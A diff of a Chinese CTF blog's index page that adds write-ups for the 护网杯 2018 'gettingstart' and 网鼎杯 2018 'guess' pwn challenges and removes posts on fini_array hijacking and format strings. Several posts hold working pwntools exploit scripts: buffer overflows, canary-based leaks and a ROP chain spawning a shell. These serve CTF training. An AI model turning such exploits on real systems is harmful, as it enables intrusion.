@@ -155,6 +155,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/" class="post-title-link" itemprop="url">护网杯_2018_gettingstart</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-17 15:50:23 / 修改时间：16:00:52" itemprop="dateCreated datePublished" datetime="2021-12-17T15:50:23+08:00">2021-12-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>小数在内存中的储存</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>main() 函数如下，题目很简单，只要利用 buf[] 的越界将 v5 和 v6 覆盖成要求值即可 </p>
+<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/main.jpg" class>
+
+<p>一开始没想到怎么将 v6 覆盖成 0.1，然后就直接开编译器查看其在内存中的存储形式，如下</p>
+<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26578</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3fb999999999999a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/" class="post-title-link" itemprop="url">网鼎杯2018_guess</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-17 11:18:04 / 修改时间：12:35:50" itemprop="dateCreated datePublished" datetime="2021-12-17T11:18:04+08:00">2021-12-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol>
+<li>在触发 <code>__stack_chk_fail</code> 时，其会打印出 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名，但是如果我们能够修改这个指针的内容，就可以让 <code>__stack_chk_fail</code> 打印出我们想要的内容</li>
+<li>libc 中保存了一个叫 <code>__environ</code> 的函数，其存储当前进程的环境变量地址，而环境变量存储在栈上，所以 <code>__environ</code> 存储的也是栈上的地址，可以通过泄漏 <code>__environ</code> 的内容得到栈地址</li>
+</ol>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下</p>
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/checksec.jpg" class>
+
+<p>主逻辑如下</p>
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/main-1.jpg" class>
+
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/main-2.jpg" class>
+
+<p>可以看到程序先将 flag 写到了栈上，然后进入while循环，跟进到 <code>sub_400A11</code> </p>
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/sub_400A11.jpg" class>
+
+<p>程序在这个函数内 fork() 了子进程，然后将 fork() 的返回值返回，到 main() 函数处子进程break，继续往下执行，父进程在while循环内被 wait() 阻塞。</p>
+<p>因为 v7 = 0，v8 = 3，所以父进程最多 fork 出3个子进程后就会退出。</p>
+<p>下面的内容就是给了一个 gets() ，然后将我们的输入跟 buf，也就是写到栈上的flag进行比较。比较部分是没有意义的，所以这题的关键在于如何泄漏出栈上的flag。</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>因为我们的输入 s2 在 buf 的上方，所以我们的输入不会覆盖到栈上的flag。同时因为存在Canary，而且因为是子进程执行我们的输入，所以子进程触发了Canary也没有关系。那么我们就可以利用<code>__stack_chk_fail</code> 来泄漏一些内容。</p>
+<p>总体思路：</p>
+<p>①利用 gets() 的溢出将栈上的 argv[0] 的内容覆盖为 libc 中函数的地址，然后执行 <code>__stack_chk_fail</code> 时就会打印出 libc 中的地址，以此泄漏 libc 地址。</p>
+<p>②再将 argv[0] 覆盖成 libc 中的 <code>__environ</code> 函数，以此泄漏栈地址。</p>
+<p>③得到栈地址后只需要计算出泄漏的栈地址跟 buf 的偏移即可得到 buf 的地址，然后将 argv[0] 覆盖成buf的地址即可</p>
+<p>过程如下：</p>
+<p>先找到我们的输入与 argv[0] 的相对距离，在 strcmp() 下断点查看栈空间</p>
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-2.jpg" class>
+
+<p>所以我们需要输入 0x128 个字节作padding，然后再加需要泄漏的内容即可覆盖 argv[0]，我们输入 <code>&#39;a&#39;*0x128 + p64(elf.got[&#39;puts&#39;])</code> 查看结果</p>
+<img src="/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/%E8%B0%83%E8%AF%95-3.jpg" class>
+
+<p>可以看到成功泄漏出了 libc 的函数的地址，接下来的过程不再赘述，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./guess&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./guess&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts_addr =&gt; &#x27;</span>,<span class="built_in">hex</span>(addr)</span><br><span class="line">libc_base = addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr =&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/16/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -941,188 +1102,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">fini_array劫持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-26 15:21:49" itemprop="dateCreated datePublished" datetime="2021-11-26T15:21:49+08:00">2021-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-05 02:35:02" itemprop="dateModified" datetime="2022-03-05T02:35:02+08:00">2022-03-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="fini-array劫持（没写完）"><a href="#fini-array劫持（没写完）" class="headerlink" title="fini_array劫持（没写完）"></a>fini_array劫持（没写完）</h2><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li><p>虽然写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。其流程见于链接<a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a></p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini.png" class>
-
-<p>简单地说，在main函数前会调用 <code>.init</code> 段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的，main函数结束后也会调用 <code>.fini</code> 段代码和 <code>.fini_array</code> 段的函数数组中每一个函数指针。</p>
-</li>
-<li><p>当<code>RELRO</code>保护为<code>NO RELRO</code>的时候，<code>init.array、fini.array、got.plt</code>均可读可写；</p>
-<p>为<code>PARTIAL RELRO</code>的时候，<code>ini.array、fini.array</code>可读不可写，<code>got.plt</code>可读可写；</p>
-<p>为<code>FULL RELRO</code>时，<code>init.array、fini.array、got.plt</code>均可读不可写。</p>
-</li>
-</ul>
-<p>在<code>fini_array</code> 数组中存在两个函数指针，分别指向下面两个函数：</p>
-<p>array[0]:__do_global_dtors_aux<br>array[1]:fini</p>
-<p>这两个函数都会在main函数执行完后执行，且先执行 <code>array[1]</code> 再执行 <code>array[0]</code> ，如果我们覆盖了这两个函数指针，就可以劫持程序的执行流。同时这两个函数指针在 <code>__libc_csu_fini</code> 中被执行，所以如果我们将 <code>array[0]</code> 覆盖为 <code>__libc_csu_fini</code> ，将 <code>array[1]</code> 覆盖为另一个地址A，那么按照执行顺序，在执行完main函数后，在 <code>___libc_csu_fini</code> 中执行 <code>array[1]</code> 的地址A，然后执行 <code>array[0]</code> ，显然因为 <code>array[0]</code> 被覆盖成了 <code>__libc_csu_fini</code> ，所以程序会再次执行地址A……，如下图</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini-1.jpg" class>
-
-<p>显然，如果 <code>array[0]</code> 中的 <code>__libc_csu_fini</code> 不变，地址A就会无限次执行，如果地址A中存在有限字节的任意地址写，那么我们就可以通过这个循环实现无限字节的任意地址写。</p>
-<p>在 <code>__libc_csu_fini</code>函数中有这样一句代码 <code>.text:0000000000402968                 lea     rbp, fini_array_0</code>，其将rbp修改为 <code>fini_array_0</code> 的首地址，所以我们就可以配合 <code>leave;ret</code> 和 <code>ret</code> 指令将栈迁移至 <code>fini_array</code> 中。</p>
-<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol>
-<li>将 <code>fini_array_0</code> 修改为<code> __libc_csu_fini</code> 的地址，将<code> fini_array_1</code> 修改为<code>func()</code></li>
-<li>利用 <code>func()</code> 中存在的任意地址写，在 <code>fini_array + 0x10</code> 处构造ROP链</li>
-<li>将 <code>fini_array_0</code> 修改为 <code>leave_ret</code> ，将 <code>fini_array_1</code> 修改为 <code>ret</code></li>
-</ol>
-<h4 id="在-fini-array-0x10-处构造ROP链的解释"><a href="#在-fini-array-0x10-处构造ROP链的解释" class="headerlink" title="在 fini_array + 0x10 处构造ROP链的解释"></a>在 fini_array + 0x10 处构造ROP链的解释</h4><p>我们构造完ROP链后有两种方法将栈迁移至 <code>fini_array</code> </p>
-<h5 id="方法一：在-fini-array-0-处迁移栈"><a href="#方法一：在-fini-array-0-处迁移栈" class="headerlink" title="方法一：在 fini_array[0] 处迁移栈"></a>方法一：在 fini_array[0] 处迁移栈</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fini_array + 0x0: (gadget)leave_ret</span><br><span class="line">fini_array + 0x8: (gadget)ret</span><br><span class="line">fini_array + 0x10: ROP chain</span><br></pre></td></tr></table></figure>
-
-<p>我们利用循环构造完ROP链之后，在下一次循环中需要将 fini_array[0] 和 fini_array[1] 分别修改为 leave_ret 和 ret ，修改完后此时循环从 fini_array[1] =&gt; fini_array[0] 中，因为在上一次循环中 __libc_csu_fini 会将 rbp 迁移到 fini_array 的首地址，所以程序在这一步执行的 fini_array[0] 中的 leave_ret 会将 rsp 迁移到 fini_array + 0x10 的位置中，同时 rip 被修改为 ret，所以再执行完 ret 后，位于 fini_array + 0x10 处的ROP链就被 pop 到了 rip 中，这样就能执行完我们的ROP链。图示如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini-p1.jpg" class>
-
-
-
-<h5 id="方法二：在-fini-array-1-处迁移栈（需要迁移两次）"><a href="#方法二：在-fini-array-1-处迁移栈（需要迁移两次）" class="headerlink" title="方法二：在 fini_array[1] 处迁移栈（需要迁移两次）"></a>方法二：在 fini_array[1] 处迁移栈（需要迁移两次）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fini_array + 0x0: (data)fini_array+0x8</span><br><span class="line">fini_array + 0x8: (gadget)leave_ret</span><br><span class="line">fini_array + 0x10: rop chain</span><br></pre></td></tr></table></figure>
-
-<h4 id="一道例题（DASCTF-—-Memory-Monster-II）"><a href="#一道例题（DASCTF-—-Memory-Monster-II）" class="headerlink" title="一道例题（DASCTF — Memory Monster II）"></a>一道例题（DASCTF — Memory Monster II）</h4><p>程序保护如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/checksec.png" class>
-
-<p>这是一道静态链接的题目，同时符号表被删除了，start()函数如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/start.jpg" class>
-
-<p>我们知道start()的第一个参数是main()，第四个参数是 __libc_csu_init，第五个参数是 _libc_csu_fini，所以我们可以找到这三个函数。</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/start-1.jpg" class>
-
-<p>main()函数如下（给函数改了名方便阅读）：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/main.jpg" class>
-
-<p>可以看到main()中实际是存在Canary的，同时存在程序给的任意地址写，所以我们可以利用这个任意地址写来构造ROP链。因为是静态链接的题目，所以我们可以找到我们所需要的gadget来构造系统调用。显然 0x18 个字节的任意地址写远不够我们使用，所以我们可以劫持 fini_array 来重复使用程序的这段任意地址写来将ROP链构造完成。相关细节在前面已经说过，这里不再赘述，exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&quot;./2&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">fini_array = 0x4B80B0</span><br><span class="line">_libc_csu_fini = 0x402CB0</span><br><span class="line">main = 0x401C1D</span><br><span class="line">ret = 0x401016</span><br><span class="line">pop_rdx = 0x448415</span><br><span class="line">pop_rsi = 0x406f80</span><br><span class="line">pop_rdi = 0x401746</span><br><span class="line">leave_ret = 0x401cf3</span><br><span class="line">pop_rax = 0x448fcc</span><br><span class="line">binsh = 0x492895</span><br><span class="line">syscall = 0x402514</span><br><span class="line"></span><br><span class="line">def write(addr,data):</span><br><span class="line">    p.sendlineafter(&quot;addr:&quot;,p64(addr))</span><br><span class="line">    p.sendafter(&quot;data:&quot;,data)</span><br><span class="line">    </span><br><span class="line">p1 = p64(_libc_csu_fini) + p64(main)</span><br><span class="line">write(fini_array,p1)</span><br><span class="line">p2 = flat(pop_rax,59,pop_rdi)</span><br><span class="line">write(fini_array + 0x10,p2)</span><br><span class="line">p3 = flat(binsh,pop_rsi,0)</span><br><span class="line">write(fini_array + 0x10 + 0x18,p3)</span><br><span class="line">p4 = flat(pop_rdx,0,syscall)</span><br><span class="line">write(fini_array + 0x10 + 0x18 + 0x18,p4)</span><br><span class="line"></span><br><span class="line">p5 = flat(leave_ret,ret)</span><br><span class="line">write(fini_array,p5)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>syscall指令可以在IDA中 alt + t 找到</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/find.jpg" class>
-
-<p>一个小问题：往地址中写入值的时候不能用”sendline”，因为这会往地址中写入一个回车，造成错误</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-3/" class="post-title-link" itemprop="url">格式化字符串-3</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-22 19:15:49" itemprop="dateCreated datePublished" datetime="2021-11-22T19:15:49+08:00">2021-11-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-04 04:08:05" itemprop="dateModified" datetime="2022-02-04T04:08:05+08:00">2022-02-04</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="格式化字符串在bss段的处理（没写完）"><a href="#格式化字符串在bss段的处理（没写完）" class="headerlink" title="格式化字符串在bss段的处理（没写完）"></a>格式化字符串在bss段的处理（没写完）</h2><p>当格式化字符串不在栈上，而是在堆上或者 .bss 段上的时候，我们便无法直接往栈上写入我们想要读写的地址。但是我们也可以通过修改栈上的指针为我们想要读写的地址，进而在栈上得到我们想要读写的地址来完成类似的利用手法。</p>
-<p>我们知道格式化字符串参数 %n 会把其对应的参数作为指针解析，并往该指针所指向的地址写入已经打印出的字节数大小。同时由于函数调用的过程，只要我们此时所在的函数是作为被调用函数（存在其父函数），那么该函数的栈帧中就会保存有其父函数的 rbp 地址，同理这个 rbp 地址中同样保存了一个栈地址，这样我们就得到了一个天然的存在于栈上的链式指针结构，我们就可以利用这个结构来让我们想要读写的地址出现在栈上。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1192,14 +1171,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-count">39</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
